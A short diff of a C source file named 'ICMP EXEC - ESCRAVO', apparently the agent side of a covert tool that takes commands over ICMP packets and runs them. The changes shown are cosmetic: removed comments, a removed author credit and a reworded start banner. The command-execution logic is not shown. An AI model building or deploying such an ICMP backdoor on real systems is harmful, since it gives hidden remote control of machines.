@@ -2,26 +2,20 @@
 #include <stdlib.h>
 #include <sys/types.h>
 #include <sys/socket.h>
-#include <sys/stat.h>
 #include <netinet/in.h>
 #include <netinet/ip_icmp.h>
 #include <netinet/ip.h>
 #include <string.h>
 #include <unistd.h>
 
-/*
-	ICMP EXEC - ESCRAVO
-	By: Zer0
-*/
+// ICMP EXEC - ESCRAVO
 
 #define SIZ 1024
 
-// Estruturas
 struct sockaddr_in dst_addr , src_addr;
 struct icmphdr *icmp;
 struct iphdr *ip;
 
-// Funções
 unsigned short checksum(void *b, int len); 
 FILE *executa(char *cmd);
 
@@ -39,8 +33,8 @@ int main(int argc , char *argv[])
         return 1;
     }
 
-    printf("> ICMP EXEC - BY: Zer0\n");
-    printf("> Iniciado...\n");
+    printf("> ICMP EXEC - Escravo \n");
+    printf("> Iniciando...\n");
 
     while(1)
     {
